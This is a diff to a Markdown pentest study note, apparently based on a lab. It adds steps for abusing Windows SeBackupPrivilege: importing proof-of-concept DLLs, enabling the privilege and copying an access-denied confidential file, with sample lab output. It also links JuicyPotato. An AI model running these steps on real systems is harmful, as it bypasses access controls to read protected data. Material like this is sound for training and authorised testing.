@@ -85,12 +85,109 @@ to a new/suspended process
 
 > [!todo]
 
+<!-- Tools {{{-->
 > [!tip]- Tools
 >
 > Abuse `SeAssignPrimaryTokenPrivilege` to escalate privileges
 >
 > - [Juicypotato](https://github.com/ohpe/juicy-potato)
+<!-- }}} -->
 
+___
+<!-- }}} -->
+
+<!-- SeBackupPrivilege {{{-->
+## SeBackupPrivilege
+
+[SeBackupPrivilege](https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/privileges)
+allows to traverse any folder and list the folder contents
+
+1. Import [SeBackupPrivilege POC](https://github.com/giuliano108/SeBackupPrivilege)
+   libraries
+
+```powershell
+Import-Module .\SeBackupPrivilegeUtils.dll
+```
+
+```powershell
+Import-Module .\SeBackupPrivilegeCmdLets.dll
+```
+
+2. Enable and verify privilege
+
+```powershell
+Set-SeBackupPrivilege
+```
+
+```powershell
+Get-SeBackupPrivilege
+```
+
+<!-- Example {{{-->
+> [!example]-
+>
+> ```powershell
+> PS C:\htb> Set-SeBackupPrivilege
+> ```
+>
+> ```powershell
+> PS C:\htb> Get-SeBackupPrivilege
+> ```
+>
+> ```sh
+> SeBackupPrivilege is enabled
+> ```
+<!-- }}} -->
+
+4. Copy a protected file
+
+```powershell
+Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
+```
+
+<!-- Example {{{-->
+> [!example]-
+>
+> 1. Try accessing the file
+>
+> ```powershell
+> PS C:\htb> cat 'C:\Confidential\2021 Contract.txt'
+> ```
+>
+> ```powershell
+> cat : Access to the path 'C:\Confidential\2021 Contract.txt' is denied.
+> At line:1 char:1
+> + cat 'C:\Confidential\2021 Contract.txt'
+> + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+>     + CategoryInfo          : PermissionDenied: (C:\Confidential\2021 Contract.txt:String) [Get-Content], Unauthor
+>    izedAccessException
+>     + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
+> ```
+>
+> 2. Copy the file with `Copy-FileSeBackupPrivilege`
+>
+> ```powershell
+> PS C:\htb> Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
+> ```
+> ```powershell
+> Copied 88 bytes
+> ```
+>
+> 3. Open file
+>
+> ```powershell
+> PS C:\htb>  cat .\Contract.txt
+> ```
+> ```powershell
+> Inlanefreight 2021 Contract
+>
+> ==============================
+>
+> Board of Directors:
+>
+> <...SNIP...>
+> ```
+<!-- }}} -->
 
 ___
 <!-- }}} -->
@@ -566,9 +663,6 @@ cat 'C:\Share\cred.txt'
 > [!warning]
 >
 > Ensure permissions/ownership is reverted
-
-___
-<!-- }}} -->
 
 ___
 <!-- }}} -->
